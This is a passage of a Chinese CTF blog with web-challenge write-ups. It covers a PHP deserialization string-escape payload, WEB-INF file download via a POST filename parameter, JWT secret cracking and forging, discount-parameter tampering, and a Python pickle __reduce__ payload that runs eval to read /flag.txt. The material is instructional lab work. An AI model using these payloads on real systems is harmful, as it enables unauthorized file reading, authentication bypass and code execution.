<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=&apos;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&apos;;</span><br></pre></td></tr></table></figure>
<p>之前也做过类似题目，只要序列化对象正确反序列化后，后边的数据会被忽略。在本题构造如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">$nickname[]=&apos;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&apos;;</span><br><span class="line">$test[&apos;phone&apos;]=12345678901;</span><br><span class="line">$test[&apos;email&apos;]=&apos;test@test.com&apos;;</span><br><span class="line">$test[&apos;nickname&apos;]=$nickname;</span><br><span class="line">$test[&apos;photo&apos;]=&apos;upload&apos; . md5(&apos;test.jpg&apos;);</span><br><span class="line">$result= filter(serialize($test));</span><br><span class="line">echo $result;</span><br><span class="line">// echo serialize($test);</span><br><span class="line">// echo var_dump(NULL &lt; 10);</span><br></pre></td></tr></table></figure>
<p>执行结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;i:12345678901;s:5:&quot;email&quot;;s:13:&quot;test@test.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:38:&quot;upload0412c29576c708cf0155e8de242169b1&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这也就是插入数据库的数据内容，反序列化的时候只读取到config.php就反序列化完毕了，于是flag包含在了返回的base64编码部分。<br>解码一下就得到flag。</p>
<h3 id="总结-25"><a href="#总结-25" class="headerlink" title="总结"></a>总结</h3><p>本来是做过相关题型的，但是居然再次没做出来，非常的不应该了。<br>这类题感觉都有点特点，就是有过滤，而且会对序列化对象过滤，导致了漏洞的产生。<br>而且题目套路大都是先序列化，过滤，再反序列化。最后根据题目实际情况，构造适当payload拿到flag。<br>还是引用大佬的一句名言</p>
<blockquote>
<p>任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞</p>
</blockquote>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>参考链接<a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">传送门</a><br>知识点</p>
<ul>
<li>WEB-INF/web.xml泄露<blockquote>
<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问.WEB-INF主要包含一下文件或目录：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/： 包含了站点所有的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>漏洞成因</strong><br>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br><strong>漏洞检测及利用方法</strong><br>通过找到web.xml文件，推断class文件的路径，最后直接下载class文件，再通过反编译class文件，得到网站源码。</p>
<h2 id="一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx-配合Tomcat做均衡负载或集群等情况时，可能出现问题。问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了：-location-WEB-INF-deny-all-或者return-404-或者其他！"><a href="#一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx-配合Tomcat做均衡负载或集群等情况时，可能出现问题。问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了：-location-WEB-INF-deny-all-或者return-404-或者其他！" class="headerlink" title="一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，可能出现问题。问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！"></a>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，<strong>Nginx 配合Tomcat做均衡负载或集群等情况时，可能出现问题。</strong>问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</h2><p>回到本题，进去提示登录然后有一个help页面。<br>提示文件下载错误。<br>随便输入一个不存在的路径，发现后端软件版本号，搜了一下相关cve，有两个，不过对本题解题都没啥帮助反而浪费了点时间。<br>后来实在想不到了就去看wp了。<br><a href="https://www.cnblogs.com/wangtanzhi/p/12173215.html" target="_blank" rel="noopener">传送门</a><br>这里稀里糊涂的就看到大家都说要改请求方法为POST，但是却没谁解释一下为什么要这么做。<br>但是确实能下载到文件了。<br>post如下参数即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p>里面有flag的文件路径，结合刚才的参考资料，我们知道WEB-INF下有一个classes包含了检点所有的class文件。<br>直接下载FlagController.class。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
<p>找到里面的base64部分解码一下就是flag了。</p>
<h3 id="总结-26"><a href="#总结-26" class="headerlink" title="总结"></a>总结</h3><p>这道题是碰到的第一道JAVA相关的题目，没啥思路，为此特意去看了一下java的基本语法之类的。<br>虽然题目没做出来，但是好歹也算是能看懂java代码多点了，好事。</p>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>知识点</p>
<ul>
<li>逻辑漏洞</li>
<li>jwt破解</li>
<li>python反序列化漏洞</li>
</ul>
<hr>
<p>发现要买lv6.写个小脚本跑一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">data = &#123;&apos;_xsrf&apos;: &apos;2%7C6c6ecde7%7C10e590b5b35ab47ee0734da11efe64d1%7C1586505301&apos;,&apos;become&apos;:pickle.dumps(&apos;admin&apos;)&#125;</span><br><span class="line">cookies = &#123;&apos;_xsrf&apos;: &apos;2|c10c0dfa|bd8750a81e3874634d118dbcb39ca4cc|1586505301&apos;, &apos;commodity_id&apos;: &apos;&quot;2|1:0|10:1586513585|12:commodity_id|8:MTYyNA==|7f6f882d70781d0f478a6278ecf34d9fb2e23e2f5bfac6b860aa47ba7e3d45d9&quot;&apos;, &apos;JWT&apos;: &apos;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&apos;&#125;</span><br><span class="line">print(data)</span><br><span class="line">res = requests.post(&apos;http://78be68c5-62cf-41b2-b904-4451d6ddd084.node3.buuoj.cn/b1g_m4mber&apos;,data=data, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>最后在180页发现了lv6.<br>进去，点击购买，发现要注册一下，就随便注册一下了。<br>继续刚才的购买，点击购买的时候会把商品放到购物车里面，发现有个打折券，抓包看一下发现有个discount参数。<br>改动一下这个数据，使discount=0.0000000000000001，买下这个账号。<br><img src="https://i.loli.net/2020/04/10/YFPaVd1tybumqQZ.png" alt="Snipaste_2020-04-10_21-21-52.png"><br>然后提示只有admin才能访问这个页面。<br><img src="https://i.loli.net/2020/04/10/Cq9ISfR3t4aogAn.png" alt="Snipaste_2020-04-10_21-22-38.png"></p>
<p>然后就尝试了一下注册admin，发现不行，尝试了各种错误的方向，始终不得精髓。<br>其实自己还是注意到了登录后多了一个jwt的cookie，但是那时候没往上面想，最终浪费大量时间没写出来。<br>还是去看了wp。</p>
<hr>
<p>参考<a href="https://blog.csdn.net/weixin_43345082/article/details/97817909" target="_blank" rel="noopener">wp传送门</a><br><a href="https://delcoding.github.io/2018/03/jwt-bypass/" target="_blank" rel="noopener">jwt参考</a><br><a href="https://jwt.io/" target="_blank" rel="noopener">在线构造jwt</a></p>
<blockquote>
<p>JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用.点号分割<br>这几个部分可以分隔开后base64解密一下。<br>这里把我做题的时候的jwt拿去解密后发现如下内容<br><img src="https://i.loli.net/2020/04/10/6xYLeatDQV4JiGZ.png" alt="Snipaste_2020-04-10_21-27-05.png"><br>但是如同参考文章所言，不只是把username改成admin就行了的，还要能通过服务端的验证。<br>这里用到了<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt破解工具</a><br>克隆到本地make一下就可用了。破解出加密的密钥为1Kun。然后回到刚才的在线构造jwt网站去构造一下jwt。<br><img src="https://i.loli.net/2020/04/10/FSGUxThAVdIBJyj.png" alt="Snipaste_2020-04-10_21-30-12.png"><br>复制这个内容，然后刷新一下cookie就进去了<br><img src="https://i.loli.net/2020/04/10/NHmWGxzOKVc3uI5.png" alt="Snipaste_2020-04-10_21-31-12.png"><br>在这个页面查看源码，发现给了后台源码，下载下来。<br>下面给出关键的源码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">路由部分</span><br><span class="line"></span><br><span class="line">from Shop import *</span><br><span class="line">from User import *</span><br><span class="line">from Admin import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handlers = [</span><br><span class="line">    (r&apos;/&apos;, ShopIndexHandler),</span><br><span class="line">    (r&apos;/shop&apos;, ShopListHandler),</span><br><span class="line">    (r&apos;/info/(\d+)&apos;, ShopDetailHandler),</span><br><span class="line">    (r&apos;/shopcar&apos;, ShopCarHandler),</span><br><span class="line">    (r&apos;/shopcar/add&apos;, ShopCarAddHandler),</span><br><span class="line">    (r&apos;/pay&apos;, ShopPayHandler),</span><br><span class="line">    (r&apos;/user&apos;, UserInfoHandler),</span><br><span class="line">    (r&apos;/user/change&apos;, changePasswordHandler),</span><br><span class="line">    (r&apos;/pass/reset&apos;, ResetPasswordHanlder),</span><br><span class="line">    (r&apos;/login&apos;, UserLoginHanlder),</span><br><span class="line">    (r&apos;/logout&apos;, UserLogoutHandler),</span><br><span class="line">    (r&apos;/register&apos;, RegisterHandler),</span><br><span class="line">    (r&apos;/b1g_m4mber&apos;, AdminHandler)</span><br><span class="line"></span><br><span class="line">刚才我们访问的路由是/b1g_m4mber</span><br><span class="line">查看这个类</span><br><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&apos;form.html&apos;, res=&apos;This is Black Technology!&apos;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&apos;no_ass.html&apos;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&apos;become&apos;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&apos;form.html&apos;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&apos;form.html&apos;, res=&apos;This is Black Technology!&apos;, member=0)</span><br></pre></td></tr></table></figure>
<p>到这里就不会了，又参考一下wp。发现和python的魔术方法有关系，可以从上面做文章。而且这里的后端代码是用python2写的。<br><img src="https://i.loli.net/2020/04/10/9gbA5sZU3SfoBHC.png" alt="Snipaste_2020-04-10_21-36-32.png"><br>最终的payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
<p>关于这个payload为什么是这么写的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象(这里是eval)，用于重建对象时调用；一个参数元素(这里是(&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))，供那个可调用对象使用；</span><br></pre></td></tr></table></figure>
<p>用python2跑一下，然后在admin页面抓包，把become的内容改成序列化后的内容就能拿到flag了。</p>
<h3 id="总结-27"><a href="#总结-27" class="headerlink" title="总结"></a>总结</h3><p>这道题弄了有七八小时吧，没做出来还是蛮沮丧的，但是好歹是又学到新知识了。<br>而且一再提醒我，遇到不会的东西，一定要去查。<br>比如这道题自己已经注意到了登陆后会多出jwt这个cookie，如果搜索一下jwt破解之类的东西，<br>就算不能完全解题，起码也能多走一步。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"># ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/02/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/" rel="next" title="汇编笔记">
                <i class="fa fa-chevron-left"></i> 汇编笔记
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/03/23/BJDCTF-2nd-web/" rel="prev" title="BJDCTF-2nd-web">
                BJDCTF-2nd-web <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
                alt="irrik" />
            
              <p class="site-author-name" itemprop="name">irrik</p>
              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">44</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BuyFlag"><span class="nav-number">1.1.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">1.2.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">1.3.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">1.4.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web1"><span class="nav-number">1.5.</span> <span class="nav-text">[SWPU2019]Web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-number">1.6.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox"><span class="nav-number">1.7.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安洵杯-2019-easy-web"><span class="nav-number">1.8.</span> <span class="nav-text">[安洵杯 2019]easy_web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-7"><span class="nav-number">1.8.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WesternCTF2018-shrine"><span class="nav-number">1.9.</span> <span class="nav-text">[WesternCTF2018]shrine</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-8"><span class="nav-number">1.9.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">1.10.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-9"><span class="nav-number">1.10.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-number">1.11.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-10"><span class="nav-number">1.11.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-RCE-ME"><span class="nav-number">1.12.</span> <span class="nav-text">[极客大挑战 2019]RCE ME</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-11"><span class="nav-number">1.12.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-number">1.13.</span> <span class="nav-text">[ASIS 2019]Unicorn shop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-12"><span class="nav-number">1.13.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Blacklist"><span class="nav-number">1.14.</span> <span class="nav-text">[GYCTF2020]Blacklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-13"><span class="nav-number">1.14.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-新生赛-Upload"><span class="nav-number">1.15.</span> <span class="nav-text">[ACTF2020 新生赛]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安洵杯-2019-easy-serialize-php"><span class="nav-number">1.16.</span> <span class="nav-text">[安洵杯 2019]easy_serialize_php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-14"><span class="nav-number">1.16.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-我有一个数据库"><span class="nav-number">1.17.</span> <span class="nav-text">[GWCTF 2019]我有一个数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-15"><span class="nav-number">1.17.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-公开赛-HappyCTFd"><span class="nav-number">1.18.</span> <span class="nav-text">[V&amp;N2020 公开赛]HappyCTFd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-16"><span class="nav-number">1.18.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-总决赛-Day2-Web1-Easyweb"><span class="nav-number">1.19.</span> <span class="nav-text">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-17"><span class="nav-number">1.19.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="nav-number">1.20.</span> <span class="nav-text">[BJDCTF2020]Cookie is so stable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-18"><span class="nav-number">1.20.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">1.21.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-19"><span class="nav-number">1.21.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-EasySearch"><span class="nav-number">1.22.</span> <span class="nav-text">[BJDCTF2020]EasySearch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-20"><span class="nav-number">1.22.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-公开赛-CHECKIN"><span class="nav-number">1.23.</span> <span class="nav-text">[V&amp;N2020 公开赛]CHECKIN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-21"><span class="nav-number">1.23.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1CTF-2019-SSRF-Me"><span class="nav-number">1.24.</span> <span class="nav-text">[De1CTF 2019]SSRF Me</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-22"><span class="nav-number">1.24.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-HardSQL"><span class="nav-number">1.25.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number">1.26.</span> <span class="nav-text">[HITCON 2017]SSRFme</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-23"><span class="nav-number">1.26.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2019-Kookie"><span class="nav-number">1.27.</span> <span class="nav-text">[BSidesCF 2019]Kookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DDCTF-2019-homebrew-event-loop"><span class="nav-number">1.28.</span> <span class="nav-text">[DDCTF 2019]homebrew event loop</span></a><ol 